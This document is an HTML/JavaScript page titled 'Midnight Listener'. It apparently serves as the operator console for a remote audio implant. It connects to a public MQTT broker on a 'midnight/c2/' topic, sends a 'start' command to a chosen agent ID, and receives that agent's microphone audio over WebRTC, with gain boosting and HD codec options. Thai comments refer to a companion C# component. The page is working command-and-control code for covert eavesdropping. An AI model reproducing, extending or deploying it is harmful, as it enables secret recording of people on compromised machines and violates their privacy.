<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Midnight WebRTC Listener</title>
    <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #1a1a1a;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: #2d2d2d;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 300px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #404040;
            color: #fff;
        }

        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
            margin-top: 10px;
        }

        #btnCall {
            background: #007acc;
            color: white;
        }

        #btnCall:hover {
            background: #005f99;
        }

        #btnStop {
            background: #cc0000;
            color: white;
            display: none;
        }

        #status {
            margin-top: 15px;
            font-size: 0.9rem;
            color: #aaa;
        }

        .pulse {
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% {
                opacity: 0.5;
            }

            50% {
                opacity: 1;
            }

            100% {
                opacity: 0.5;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>🎙️ Midnight Listener</h2>
        <input type="text" id="agentId" placeholder="Enter Agent ID (from Config)" value="user123">
        <button id="btnCall">📞 Call Agent</button>
        <button id="btnStop">🛑 Hang Up</button>
        <div id="status">Ready to connect...</div>
        <div id="controls" style="display:none; width: 100%; margin-top: 15px;">
            <div style="margin-bottom: 10px; text-align: left;">
                <label style="font-size: 0.8rem; color: #ccc;">Audio Quality:</label>
                <select id="audioQuality"
                    style="width: 100%; padding: 5px; background: #404040; color: #fff; border: none; border-radius: 5px; margin-top: 5px;">
                    <option value="standard" selected>Standard (64kbps - PCMU)</option>
                    <option value="hd">High Definition (256kbps - L16/16kHz)</option>
                </select>
            </div>
            <canvas id="visualizer" width="300" height="60"
                style="background: #000; border-radius: 5px; margin-bottom: 10px; width: 100%;"></canvas>
            <label for="volumeSlider" style="display:block; text-align:left; font-size:0.8rem; color:#ccc;">Volume
                Boost: <span id="volVal">100%</span></label>
            <input type="range" id="volumeSlider" min="1" max="5" step="0.1" value="1" style="width:100%;">
            <div style="font-size: 0.7rem; color: #666; margin-top: 5px;">*Auto-Gain Enabled</div>
            <div id="bitrate" style="font-size: 0.75rem; color: #00ff00; margin-top: 5px; font-family: monospace;">
                Bitrate: 0 kbps</div>
        </div>
        <audio id="remoteAudio" autoplay controls style="display: none;"></audio>
    </div>

    <script>
        let client;
        let pc;
        let topicBase;
        let audioCtx;
        let gainNode;
        let analyser;
        let drawVisual;
        let lastReport;
        let bitrateInterval;

        const btnCall = document.getElementById('btnCall');
        const btnStop = document.getElementById('btnStop');
        const status = document.getElementById('status');
        const remoteAudio = document.getElementById('remoteAudio');
        const controls = document.getElementById('controls');
        const volumeSlider = document.getElementById('volumeSlider');
        const volVal = document.getElementById('volVal');
        const canvas = document.getElementById('visualizer');
        const canvasCtx = canvas.getContext('2d');

        volumeSlider.oninput = () => {
            const val = parseFloat(volumeSlider.value);
            if (gainNode) gainNode.gain.value = val;
            volVal.textContent = Math.round(val * 100) + "%";
        };

        let iceQueue = [];

        btnCall.onclick = async () => {
            const agentId = document.getElementById('agentId').value;
            if (!agentId) return alert("Enter Agent ID!");

            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
            if (audioCtx.state === 'suspended') await audioCtx.resume();

            topicBase = `midnight/c2/${agentId}`;
            status.textContent = "Connecting to Broker...";
            status.className = "pulse";
            iceQueue = []; // Clear queue

            // ปรับ keepalive และ timeout ให้ทนเน็ตช้าเหมือนฝั่ง C#
            client = mqtt.connect('wss://broker.hivemq.com:8884/mqtt', {
                keepalive: 60,
                connectTimeout: 15000
            });

            client.on('connect', () => {
                status.textContent = "Broker Connected. Calling...";
                client.subscribe(`${topicBase}/offer`, { qos: 1 });
                client.subscribe(`${topicBase}/ice_agent`, { qos: 1 });
                client.publish(`${topicBase}/call`, "start", { qos: 1 });
            });

            client.on('message', async (topic, message) => {
                const payload = message.toString();

                if (topic.endsWith('/offer')) {
                    if (pc && pc.signalingState === 'stable') return;
                    status.textContent = "Offer Received. Negotiating...";
                    if (pc && pc.signalingState === 'closed') pc = null;
                    if (!pc) await createPeerConnection();

                    try {
                        let sdp = payload;
                        const quality = document.getElementById('audioQuality').value;

                        // 🛠️ Robust SDP Adjustment (ล้างบรรทัดว่างและตัวอักษรขยะ)
                        const lines = sdp.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);

                        let hdPayload = null;
                        for (const line of lines) {
                            if (line.includes('L16/16000')) {
                                const match = line.match(/a=rtpmap:(\d+)/);
                                if (match) hdPayload = match[1];
                                break;
                            }
                        }

                        for (let i = 0; i < lines.length; i++) {
                            if (lines[i].startsWith('m=audio')) {
                                const parts = lines[i].split(/\s+/).filter(p => p.length > 0);
                                if (parts.length > 3) {
                                    const mPrefix = parts.slice(0, 3);
                                    let mCodecs = parts.slice(3);

                                    if (quality === 'hd' && hdPayload) {
                                        mCodecs.sort((a, b) => (a === hdPayload ? -1 : b === hdPayload ? 1 : 0));
                                        status.textContent = "Negotiating HD Audio...";
                                    } else {
                                        mCodecs.sort((a, b) => (a === '0' ? -1 : b === '0' ? 1 : 0));
                                        status.textContent = "Negotiating Standard Audio...";
                                    }
                                    lines[i] = mPrefix.concat(mCodecs).join(' ');
                                }
                                break;
                            }
                        }
                        sdp = lines.join('\r\n') + '\r\n';

                        await pc.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: sdp }));

                        if (pc.signalingState === 'have-remote-offer') {
                            const answer = await pc.createAnswer();
                            let answerSdp = answer.sdp;

                            // 🛠️ ส่งพารามิเตอร์คุณภาพเสียงแบบชัดเจนผ่าน SDP (Custom Attribute)
                            answerSdp += `a=x-quality:${quality}\r\n`;

                            const hasL16 = answerSdp.includes('L16/16000') || answerSdp.includes(' 96 ');
                            console.log(`[WebRTC] Answer generated. Quality: ${quality}, Negotiated High: ${hasL16}`);
                            status.textContent = `Connected - Mode: ${quality === 'hd' ? "HD High Definition" : "Standard"}`;

                            await pc.setLocalDescription(answer);
                            client.publish(`${topicBase}/answer`, answerSdp, { qos: 1 });
                        }

                        while (iceQueue.length > 0) {
                            const cand = iceQueue.shift();
                            try { if (pc && pc.signalingState !== 'closed') await pc.addIceCandidate(cand); } catch (e) { }
                        }
                    } catch (e) {
                        console.error("SDP Error:", e);
                        status.textContent = "Negotiation Error. Retrying...";
                    }
                }
                else if (topic.endsWith('/ice_agent')) {
                    try {
                        const candidate = JSON.parse(payload);
                        if (pc && pc.remoteDescription && pc.signalingState !== 'closed') {
                            await pc.addIceCandidate(candidate);
                        } else if (!pc || !pc.remoteDescription) {
                            iceQueue.push(candidate);
                        }
                    } catch (e) { }
                }
            });
        };

        btnStop.onclick = () => {
            if (pc) {
                pc.close();
                pc = null;
            }
            if (client) {
                client.end();
                client = null;
            }
            if (audioCtx) {
                audioCtx.close().then(() => audioCtx = null);
            }
            if (bitrateInterval) clearInterval(bitrateInterval);
            cancelAnimationFrame(drawVisual);
            resetUI();
        };

        async function createPeerConnection() {
            pc = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' },
                    { urls: 'stun:stun.cloudflare.com:3478' } // เพิ่ม Cloudflare STUN
                ]
            });

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    client.publish(`${topicBase}/ice`, JSON.stringify(event.candidate), { qos: 1 }); // ใช้ QoS 1
                }
            };

            pc.ontrack = (event) => {
                status.textContent = "🔊 Audio Streaming...";
                status.className = "";
                status.style.color = "#0f0";

                const track = event.track;
                const stream = event.streams[0] || new MediaStream([track]);
                const source = audioCtx.createMediaStreamSource(stream);

                const compressor = audioCtx.createDynamicsCompressor();
                compressor.threshold.value = -24; // เปลี่ยนจาก -50 เป็น -24 (ให้เพดานสูงขึ้น)
                compressor.knee.value = 30;
                compressor.ratio.value = 5; // ลดแรงบีบลง
                compressor.attack.value = 0.003; // เพิ่ม attack นิดหน่อยให้เสียงไม่โดนตัดฉับพลัน
                compressor.release.value = 0.25;

                gainNode = audioCtx.createGain();
                gainNode.gain.value = parseFloat(volumeSlider.value);

                analyser = audioCtx.createAnalyser();
                analyser.fftSize = 256;
                const bufferLength = analyser.frequencyBinCount;
                const dataArray = new Uint8Array(bufferLength);

                source.connect(compressor);
                compressor.connect(gainNode);
                gainNode.connect(analyser);
                analyser.connect(audioCtx.destination);

                const draw = () => {
                    drawVisual = requestAnimationFrame(draw);
                    analyser.getByteTimeDomainData(dataArray);

                    canvasCtx.fillStyle = 'rgb(0, 0, 0)';
                    canvasCtx.fillRect(0, 0, canvas.width, canvas.height);

                    canvasCtx.lineWidth = 2;
                    canvasCtx.strokeStyle = 'rgb(0, 255, 0)';
                    canvasCtx.beginPath();

                    const sliceWidth = canvas.width * 1.0 / bufferLength;
                    let x = 0;

                    for (let i = 0; i < bufferLength; i++) {
                        const v = dataArray[i] / 128.0;
                        const y = v * canvas.height / 2;

                        if (i === 0) canvasCtx.moveTo(x, y);
                        else canvasCtx.lineTo(x, y);

                        x += sliceWidth;
                    }
                    canvasCtx.lineTo(canvas.width, canvas.height / 2);
                    canvasCtx.stroke();
                };
                draw();

                remoteAudio.srcObject = stream;
                remoteAudio.muted = false;
                remoteAudio.volume = 0;
                remoteAudio.play().catch(e => console.log("Autoplay blocked:", e));

                controls.style.display = 'block';

                // Real-time Bitrate Monitoring
                lastReport = null;
                const bitrateEl = document.getElementById('bitrate');
                if (bitrateInterval) clearInterval(bitrateInterval);

                bitrateInterval = setInterval(async () => {
                    if (!pc) return;
                    const stats = await pc.getStats();
                    stats.forEach(report => {
                        if (report.type === 'inbound-rtp' && report.kind === 'audio') {
                            if (lastReport) {
                                const bytes = report.bytesReceived - lastReport.bytesReceived;
                                const time = (report.timestamp - lastReport.timestamp) / 1000;
                                const kbps = (bytes * 8) / (time * 1000);
                                bitrateEl.textContent = `Bitrate: ${kbps.toFixed(2)} kbps`;
                            }
                            lastReport = report;
                        }
                    });
                }, 1000);
            };

            pc.onconnectionstatechange = () => {
                console.log("Connection State:", pc.connectionState);
                if (pc.connectionState === 'connected') {
                    status.textContent = "🔊 Connection Established!";
                } else if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
                    resetUI();
                }
            };

            pc.oniceconnectionstatechange = () => {
                console.log("ICE Connection State:", pc.iceConnectionState);
                if (pc.iceConnectionState === 'failed') {
                    status.textContent = "ICE Connection Failed. Check NAT/Firewall.";
                    status.style.color = "red";
                }
            };

            btnCall.style.display = 'none';
            btnStop.style.display = 'block';
        }

        function resetUI() {
            status.textContent = "Disconnected.";
            status.style.color = "#aaa";
            status.className = "";
            btnCall.style.display = 'block';
            btnStop.style.display = 'none';
            controls.style.display = 'none';
            document.getElementById('bitrate').textContent = "Bitrate: 0 kbps";
            canvasCtx.fillStyle = 'rgb(0, 0, 0)';
            canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
            if (gainNode) gainNode = null;
            pc = null;
            iceQueue = [];
        }

        window.addEventListener('load', () => {
            const params = new URLSearchParams(window.location.search);
            const urlId = params.get('id');
            const agentInput = document.getElementById('agentId');

            if (urlId) {
                agentInput.value = urlId;
                btnCall.textContent = `📞 Connect to ${urlId}`;
                btnCall.classList.add('pulse');
            }
        });
    </script>
</body>

</html>
